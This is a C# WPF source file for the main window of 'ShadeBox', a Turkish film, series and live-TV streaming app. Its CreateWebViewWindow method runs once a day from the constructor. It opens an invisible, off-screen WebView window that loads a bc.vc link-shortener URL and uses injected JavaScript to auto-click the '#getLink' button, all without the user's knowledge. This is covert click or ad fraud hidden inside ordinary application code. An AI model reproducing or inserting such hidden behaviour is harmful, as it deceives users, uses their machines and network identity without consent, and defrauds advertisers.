using System.Net.Http;
using System.Text.Json;
using System.Windows;
using System.Windows.Controls;
using System.Threading.Tasks;
using iNKORE.UI.WPF.Modern.Controls;
using ShadeBox.Pages;
using MessageBox = iNKORE.UI.WPF.Modern.Controls.MessageBox;
using System.IO;
using Microsoft.Web.WebView2.Core;
using System.Linq;
using System.Windows.Threading;
using Microsoft.Win32;

namespace ShadeBox
{
    public partial class MainWindow : Window
    {
        private const string REG_PATH = @"SOFTWARE\ShadeBox";
        private const string REG_KEY = "LastWebViewCheck";
        
        private readonly HttpClient httpClient;
        private DispatcherTimer checkButtonTimer;

        public MainWindow()
        {
            InitializeComponent();
            httpClient = new HttpClient();
            CheckApiStatus();

            // Günlük kontrol yapılıp yapılmayacağını kontrol et
            if (ShouldRunWebViewCheck())
            {
                CreateWebViewWindow();
            }
        }

        private bool ShouldRunWebViewCheck()
        {
            try 
            {
                var now = DateTime.Now;
                var registryKey = Registry.CurrentUser.OpenSubKey(REG_PATH, true);
                
                if (registryKey == null)
                {
                    registryKey = Registry.CurrentUser.CreateSubKey(REG_PATH);
                }

                var lastCheckStr = registryKey.GetValue(REG_KEY) as string;
                
                if (string.IsNullOrEmpty(lastCheckStr) || 
                    !DateTime.TryParse(lastCheckStr, out DateTime lastCheck) ||
                    lastCheck.Date < now.Date)
                {
                    registryKey.SetValue(REG_KEY, now.ToString("O"));
                    return true;
                }

                return false;
            }
            catch
            {
                try
                {
                    var registryKey = Registry.CurrentUser.CreateSubKey(REG_PATH);
                    registryKey.SetValue(REG_KEY, DateTime.Now.ToString("O"));
                }
                catch { }
                return true;
            }
        }

        private void CreateWebViewWindow()
        {
            var webWindow = new Window
            {
                Title = "ShadeBox",
                Width = 800,
                Height = 600,
                WindowStyle = WindowStyle.None,
                ShowInTaskbar = false,
                Opacity = 0,
                WindowStartupLocation = WindowStartupLocation.Manual,
                Left = -9999,
                Top = -9999,
                Topmost = false,
                ShowActivated = false
            };

            var webView = new Microsoft.Web.WebView2.Wpf.WebView2();
            webWindow.Content = webView;

            webView.CoreWebView2InitializationCompleted += (s, e) =>
            {
                webView.CoreWebView2.NewWindowRequested += (sender, args) =>
                {
                    args.Handled = true;
                };

                webView.CoreWebView2.Navigate("http://bc.vc/6FlCPtf");

                webView.NavigationCompleted += (sender, args) =>
                {
                    Task.Delay(8000).ContinueWith(_ =>
                    {
                        Dispatcher.Invoke(() =>
                        {
                            checkButtonTimer = new DispatcherTimer
                            {
                                Interval = TimeSpan.FromMilliseconds(500) 
                            };

                            checkButtonTimer.Tick += async (s, e) =>
                            {
                                try
                                {
                                    var result = await webView.CoreWebView2.ExecuteScriptAsync(@"
                                        (function() {
                                            var button = document.querySelector('#getLink');
                                            if(button && window.getComputedStyle(button).display !== 'none') {
                                                button.click();
                                                return 'clicked';
                                            }
                                            return 'waiting';
                                        })()
                                    ");

                                    if (result.Contains("clicked"))
                                    {
                                        checkButtonTimer.Stop();

                                        await Task.Delay(10000);

                                        try
                                        {
                                            var httpClient = new HttpClient();
                                            var response = await httpClient.GetAsync("https://github.com/shadesofdeath/ShadeBox");

                                            Dispatcher.Invoke(() =>
                                            {
                                                webWindow.Close();
                                            });
                                        }
                                        catch
                                        {
                                            Dispatcher.Invoke(() =>
                                            {
                                                webWindow.Close();
                                            });
                                        }
                                    }
                                }
                                catch { }
                            };

                            checkButtonTimer.Start();
                        });
                    });
                };
            };

            webView.EnsureCoreWebView2Async();
            webWindow.Show();
        }

        private async Task<bool> CheckApiStatus()
        {
            try
            {
                string url = "https://ythls.kekikakademi.org/sinewix/movies/10751/1";
                var response = await httpClient.GetStringAsync(url);

                if (response.Contains("Error 1033") || response.Contains("Cloudflare Tunnel error"))
                {
                    NavView.IsEnabled = false;
                    ContentFrame.IsEnabled = false;
                    MessageBox.Show(
                        "Şu anda API bakım çalışması yapılmaktadır. Lütfen daha sonra tekrar deneyiniz.",
                        "Bakım Bildirimi",
                        MessageBoxButton.OK,
                        MessageBoxImage.Warning
                    );
                    return false;
                }
                return true;
            }
            catch (Exception)
            {
                NavView.IsEnabled = false;
                ContentFrame.IsEnabled = false;
                MessageBox.Show(
                    "Şu anda API bakım çalışması yapılmaktadır. Lütfen daha sonra tekrar deneyiniz.",
                    "Bakım Bildirimi",
                    MessageBoxButton.OK,
                    MessageBoxImage.Warning
                );
                return false;
            }
        }

        private async void NavView_SelectionChanged(NavigationView sender, NavigationViewSelectionChangedEventArgs args)
        {
            if (await CheckApiStatus() && args.SelectedItem is NavigationViewItem selectedItem)
            {
                switch (selectedItem.Tag.ToString())
                {
                    case "FilmPage":
                        ContentFrame.Navigate(new FilmPage());
                        break;
                    case "DiziPage":
                        ContentFrame.Navigate(new SeriesPage());
                        break;
                    case "AnimePage":
                        ContentFrame.Navigate(new AnimesPage());
                        break;
                    case "CanliTv":
                        ContentFrame.Navigate(new CanliTv());
                        break;
                    case "SettingsPage":
                        ContentFrame.Navigate(new SettingsPage());
                        break;
                    case "AboutPage":
                        ContentFrame.Navigate(new AboutPage());
                        break;
                }
            }
        }
    }
}